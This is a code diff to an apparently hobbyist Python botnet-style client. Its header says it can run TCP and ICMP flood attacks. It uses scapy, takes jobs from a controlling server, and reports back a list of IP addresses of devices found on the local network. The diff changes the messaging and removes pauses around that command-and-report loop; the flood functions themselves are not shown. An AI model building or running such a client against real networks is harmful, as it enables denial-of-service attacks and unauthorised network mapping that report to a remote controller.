@@ -14,7 +14,6 @@
 # 2) execute a TCP flood attack against an IP or port
 
 import socket  # socket object will be used to make the connection
-#from scapy.all import ARP, Ether, srp
 from scapy.all import *
 
 
@@ -203,22 +202,18 @@ def ICMPFlood(target_ip):
 
 
 sendMsgToServer(GREETING_MSG)  # first message to send
-input()
+
 rcvd_msg = client.recv(2048).decode(FORMAT)
 print(rcvd_msg)  # print receive message from server
-
 jobResult = jobHandler(rcvd_msg)
-
 if isinstance(jobResult, list):  # if the result is a list it means list of IPs is returned
+    sendMsgToServer(
+        "The Following Devices Are currently connected to the network: ")
     for ipAddr in jobResult:
         sendMsgToServer(ipAddr)
 else:
     sendMsgToServer(jobResult)
 
 
-input()
-
-
-input()
 sendMsgToServer("Disconnecting now!")  # disconnect message
 sendMsgToServer(DISCONNECT_MESSAGE)  # send disconnect message
